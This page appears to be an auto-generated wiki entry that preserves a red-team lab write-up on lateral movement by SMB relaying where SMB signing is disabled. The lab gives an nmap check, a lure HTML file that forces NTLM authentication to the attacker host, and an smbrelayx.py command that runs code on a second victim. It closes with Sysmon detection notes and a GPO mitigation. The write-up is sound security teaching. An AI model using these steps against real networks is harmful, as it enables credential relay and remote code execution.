---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Lateral Movement via SMB Relaying

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-lateral-movement-lateral-movement-via-smb-relaying-by-abusing-lack-of-smb-signing` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/lateral-movement/lateral-movement-via-smb-relaying-by-abusing-lack-of-smb-signing.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Lateral Movement via SMB Relaying](../../topics/offensive-security/lateral-movement-via-smb-relaying.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-lateral-movement-lateral-movement-via-smb-relaying-by-abusing-lack-of-smb-signing |
| name | Lateral Movement via SMB Relaying |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/lateral-movement/lateral-movement-via-smb-relaying-by-abusing-lack-of-smb-signing.md |

## Preserved Source Material

````yaml
_asset_filenames:
- Peek 2018-12-30 22-31.gif
- Screenshot from 2018-12-30 22-33-59.png
- Screenshot from 2018-12-30 22-36-01.png
- Screenshot from 2018-12-31 10-36-45.png
- Screenshot from 2018-12-31 10-45-27.png
- Screenshot from 2018-12-31 11-05-59.png
- Screenshot from 2018-12-31 13-29-13.png
_body: "# Lateral Movement via SMB Relaying\n\nThis lab looks at a lateral movement technique abusing SMB protocol if SMB\
  \ signing is disabled.&#x20;\n\nSMB signing is a security mechanism that allows digitally signing SMB packets to enforce\
  \ their authenticity and integrity - the client/server knows that the incoming SMB packets they are receiving are coming\
  \ from a trusted source and that they have not been tampered with while in transit, preventing man in the middle type attacks.\n\
  \nIf SMB signing is disabled, howeverm packets can be intercepted/modified and/or relayed to another system, which is what\
  \ this lab is about.\n\n## Environment\n\n* 10.0.0.5 - attacker running Kali linux and smb relaying tool\n* 10.0.0.2 - victim1;\
  \ their credentials will be relayed to victim2\n* 10.0.0.6 - victim2; code runs on victim2 with victim1 credentials\n\n\
  {% hint style=\"warning\" %}\nCredentials from Victim1 must be for a local admin on Victim2 or be a member of Administrators/Domain\
  \ Administrators group for this attack to work successfully.\n{% endhint %}\n\nBelow is a simplified process of how this\
  \ attack works:\n\n`10.0.0.2` -authenticates to-> `10.0.0.5` -relays to-> `10.0.0.6` executes code with victim1(10.0.0.2)\
  \ credentials\n\n## Execution\n\nOne of the ways to check if SMB signing is `disabled` on an endpoint:\n\n{% code title=\"\
  attacker@kali\" %}\n```csharp\nnmap -p 445 10.0.0.6 -sS --script smb-security-mode.nse\n```\n{% endcode %}\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2018-12-31 10-45-27.png>)\n\nSince we know that victim2@10.0.0.6 has SMB signing disabled and is vulnerable to SMB\
  \ relaying attack, let's create a simple HTML file that once opened will force the victim1 to authenticate to attacker's\
  \ machine:\n\n{% code title=\"message.html\" %}\n```markup\n<html>\n    <h1>holla good sir</h1>\n    <img src=\"file://10.0.0.5/download.jpg\"\
  >\n</html>\n```\n{% endcode %}\n\n{% hint style=\"info\" %}\nAny other forced authentication method will also work - follow\
  \ below link for a list of techniques.\n{% endhint %}\n\n{% content-ref url=\"../initial-access/t1187-forced-authentication.md\"\
  \ %}\n[t1187-forced-authentication.md](../initial-access/t1187-forced-authentication.md)\n{% endcontent-ref %}\n\n...at\
  \ the same time, let's fire up SMBRelayx tool that will listen for incoming SMB authentication requests and will relay them\
  \ to victim2@10.0.0.6 and will attempt to execute a command `ipconfig`on the end host:\n\n{% code title=\"attacker@kali\"\
  \ %}\n```\nsmbrelayx.py -h 10.0.0.6 -c \"ipconfig\"\n```\n{% endcode %}\n\n{% hint style=\"info\" %}\nNote that smbrelayx\
  \ could be used with a `-e` switch that allows attacker to execute their payload file - say, a meterpreter executable.\n\
  {% endhint %}\n\nBelow is a gif showing the technique in action - on the left - `victim1@10.0.0.2` opening the malicious\
  \ html we crafted earlier that forces it to attempt to authenticate to the attacker system (on the right). Once the authentication\
  \ attempt comes in, it gets relayed to `victim2@10.0.0.6` and ipconfig gets executed:\n\n![](<../../.gitbook/assets/Peek\
  \ 2018-12-30 22-31.gif>)\n\nA stop frame from the above gif that highlights that the code execution indeed happend on 10.0.0.6:\n\
  \n![](<../../.gitbook/assets/Screenshot from 2018-12-30 22-33-59.png>)\n\n## Observations & Mitigation\n\nSmbrelayx.py leaves\
  \ a pretty good footprint for defenders in Microsoft-Windows-Sysmon/Operational - the parent image is services.exe and the\
  \ commandline has juicy details - note though that the commandline arguments are subject to forgery:\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2018-12-31 13-29-13.png>)\n\nIn order to mitigate this type of attack, the best way to do it is by implementing GPOs\
  \ if possible by setting the policy **Microsoft network server: Digitally sign communications (always)** to `Enabled`:\n\
  \n![](<../../.gitbook/assets/Screenshot from 2018-12-31 10-36-45.png>)\n\nWith the above change, trying to execute the same\
  \ attack, we get `Signature is REQUIRED` errors message and lateral movement is prevented:\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2018-12-30 22-36-01.png>)\n\nThe same nmap scan we did earlier now also shows that the `message signing is required`:\n\
  \n{% code title=\"attacker@kali\" %}\n```csharp\nnmap -p 445 10.0.0.6 -sS --script smb-security-mode\n```\n{% endcode %}\n\
  \n![](<../../.gitbook/assets/Screenshot from 2018-12-31 11-05-59.png>)\n\n## References\n\n{% embed url=\"https://ramnathshenoy.wordpress.com/2017/03/19/lateral-movement-with-smbrelayx-py/\"\
  \ %}\n\n{% embed url=\"https://blogs.technet.microsoft.com/josebda/2010/12/01/the-basics-of-smb-signing-covering-both-smb1-and-smb2/\"\
  \ %}\n\n{% embed url=\"https://nmap.org/nsedoc/scripts/smb-security-mode.html\" %}"
_relative_path: offensive-security/lateral-movement/lateral-movement-via-smb-relaying-by-abusing-lack-of-smb-signing.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/lateral-movement/lateral-movement-via-smb-relaying-by-abusing-lack-of-smb-signing.md
````
